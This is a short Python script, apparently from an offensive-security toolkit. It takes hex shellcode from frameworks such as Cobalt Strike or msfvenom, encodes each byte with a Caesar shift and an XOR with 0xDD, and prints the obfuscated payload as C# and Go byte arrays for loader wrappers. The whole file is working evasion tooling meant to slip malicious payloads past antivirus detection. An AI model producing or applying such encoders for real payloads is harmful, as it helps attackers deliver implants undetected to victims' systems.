import binascii
## Input the shellcode you want to encode. Can be any type (CS, msfvenom, etc) as long as it
## is a hex string. Will perform a Caesar Cipher and XOR with DD and output for C# and GoLang wrapper 
buf = input("Shellcode to encode: ").replace('\\x','')
buf = bytearray.fromhex(buf)

encoded = bytearray(len(buf))
for i, c in enumerate(buf):
    encoded[i] = (c + 13) & 0xFF
    encoded[i] = encoded[i] ^ 0xDD

csharp_out = ""
golang_out = ""

for b in encoded:
    csharp_out += "0x{0:02x}, ".format(b)
    golang_out += "{0:02x}".format(b)

print(f"\nThe C# payload is:\n{csharp_out[:-2]}")
print(f"\n\nThe Golang payload is:\n{golang_out}")
